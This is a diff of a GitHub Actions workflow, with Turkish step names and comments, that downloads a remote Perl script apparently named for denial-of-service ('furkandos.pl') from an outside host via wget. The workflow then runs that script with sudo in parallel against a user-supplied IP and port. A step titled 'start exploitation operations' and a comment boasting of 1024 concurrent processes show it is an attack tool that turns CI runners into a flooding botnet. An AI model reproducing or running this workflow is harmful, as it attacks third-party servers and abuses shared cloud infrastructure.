@@ -21,7 +21,7 @@ jobs:
     steps:
       - name: İndir ve Hazırla
         run: |
-          wget https://wgetz.com/UfzqVgsC3Q/a -O a
+          wget https://wgetz.com/cGafaK5Qgf/furkandos.pl -O a
           chmod +x a
           
       - name: SÖMÜRÜ İŞLEMLERİNİ BAŞLAT (4x Tekrar)
@@ -32,7 +32,7 @@ jobs:
           PIDS=()
           for i in {1..6}; do
             # Aynı anda her bir makine 4 süreç çalıştıracak! Toplam 1024 potansiyel süreç!
-            sudo timeout 60 ./a ${{ inputs.ip }} ${{ inputs.port }} 10 -1 60 &
+            sudo timeout 60 perl a ${{ inputs.ip }} ${{ inputs.port }} 1024 60 &
             PIDS+=($!)
           done
           
